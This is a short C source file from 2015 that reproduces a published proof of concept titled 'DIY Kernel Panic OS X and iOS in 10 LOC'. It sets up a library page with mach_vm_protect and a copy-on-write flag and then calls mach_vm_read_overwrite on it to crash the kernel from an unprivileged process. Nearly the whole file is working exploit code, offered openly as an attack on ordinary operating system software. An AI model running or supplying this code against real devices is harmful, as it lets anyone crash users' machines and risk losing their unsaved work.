//
//  main.m
//  KernelPanic-10LOC
//
//  Created by João D. Moreira on 21/02/15.
//  Copyright (c) 2015 goldnpot. All rights reserved.
//

// Content source: https://medium.com/@oleavr/diy-kernel-panic-os-x-and-ios-in-10-loc-c250d9649159
// HN thread: https://news.ycombinator.com/item?id=9085536

#include <unistd.h>
#include <mach/mach.h>
//#include <mach/mach_vm.h>
#include <mach-o/dyld.h>

extern kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t, mach_vm_size_t,
                                     boolean_t, vm_prot_t);

extern kern_return_t mach_vm_read_overwrite (vm_map_t, mach_vm_address_t, mach_vm_size_t,
                                             mach_vm_address_t, mach_vm_size_t*);

int main (int argc, char* argv[]) {
    volatile char *library;
    const mach_vm_size_t page_size = getpagesize();
    const mach_vm_size_t buffer_size = 3 * page_size;
    char buffer[buffer_size];
    mach_vm_size_t result_size;
    library = (char*) _dyld_get_image_header(2);
    mach_vm_protect(mach_task_self(), (mach_vm_address_t) (library + page_size),
                    page_size, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
    /* VM_PROT_EXECUTE omitted for non-jb iOS devices */
    library[page_size]++; /* COW -> PRV transition   */
    library[page_size]--; /* undo dummy-modification */
    result_size = 0;
    /* panic! */
    mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t) library, buffer_size,
                           (mach_vm_address_t) buffer, &result_size);
    
    return 0;
}